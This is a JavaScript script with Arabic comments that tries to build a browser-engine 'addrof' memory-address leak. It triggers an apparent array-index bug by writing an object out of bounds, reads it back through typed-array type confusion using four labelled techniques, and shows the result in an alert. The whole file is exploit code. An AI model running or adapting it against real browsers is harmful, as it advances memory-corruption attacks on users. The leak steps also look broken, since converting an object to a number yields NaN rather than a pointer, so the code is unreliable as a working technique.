function advanced_addrof_techniques() {
    let output = "🛠️ **تقنيات متقدمة لتسريب العناوين**\n\n";
    
    let arr = [];
    for (let i = 0; i < 2000; i++) arr[i] = i + 0.1;
    for (let i = 0; i < (1 << 22); i++) arr[i] = i + 0.1;
    
    let target_obj = {
        unique_marker: 0xDEADBEEF,
        data: "TARGET",
        array: [10, 20, 30]
    };
    
    let victim = [1.1, 2.2, 3.3];
    let largeLength = Object.keys(arr).length;
    let index = (largeLength << 3) >> 31;
    
    // تطبيق الثغرة
    for (let i = 1; i >= index; i--) {
        victim[i] = target_obj;
    }
    
    output += "🎯 تقنيات تسريب العنوان:\n\n";
    
    // التقنية 1: استخدام Property Access
    output += "1. **الوصول إلى الخاصية:**\n";
    try {
        let temp = {x: victim[1]};
        let f64 = new Float64Array(1);
        let u32 = new Uint32Array(f64.buffer);
        f64[0] = temp.x;
        
        if (isNaN(f64[0])) {
            let addr = (BigInt(u32[1]) << 32n) | BigInt(u32[0]);
            output += `   الناتج: 0x${addr.toString(16)}\n`;
        }
    } catch(e) {
        output += `   خطأ: ${e.message}\n`;
    }
    
    // التقنية 2: استخدام Array Access
    output += "2. **الوصول عبر المصفوفة:**\n";
    try {
        let temp_arr = [victim[1]];
        let f64 = new Float64Array(1);
        let u32 = new Uint32Array(f64.buffer);
        f64[0] = temp_arr[0];
        
        if (isNaN(f64[0])) {
            let addr = (BigInt(u32[1]) << 32n) | BigInt(u32[0]);
            output += `   الناتج: 0x${addr.toString(16)}\n`;
        }
    } catch(e) {
        output += `   خطأ: ${e.message}\n`;
    }
    
    // التقنية 3: استخدام Object.assign
    output += "3. **Object.assign:**\n";
    try {
        let temp = Object.assign({}, {x: victim[1]});
        let f64 = new Float64Array(1);
        let u32 = new Uint32Array(f64.buffer);
        f64[0] = temp.x;
        
        if (isNaN(f64[0])) {
            let addr = (BigInt(u32[1]) << 32n) | BigInt(u32[0]);
            output += `   الناتج: 0x${addr.toString(16)}\n`;
        }
    } catch(e) {
        output += `   خطأ: ${e.message}\n`;
    }
    
    // التقنية 4: استخدام JSON
    output += "4. **JSON.stringify/parse:**\n";
    try {
        let json_str = JSON.stringify({x: victim[1]});
        let parsed = JSON.parse(json_str);
        let f64 = new Float64Array(1);
        let u32 = new Uint32Array(f64.buffer);
        f64[0] = parsed.x;
        
        if (isNaN(f64[0])) {
            let addr = (BigInt(u32[1]) << 32n) | BigInt(u32[0]);
            output += `   الناتج: 0x${addr.toString(16)}\n`;
        } else {
            output += `   الناتج: ${f64[0]} (ليس NaN)\n`;
        }
    } catch(e) {
        output += `   خطأ: ${e.message}\n`;
    }
    
    alert(output);
}

// جرب التقنيات المتقدمة
advanced_addrof_techniques();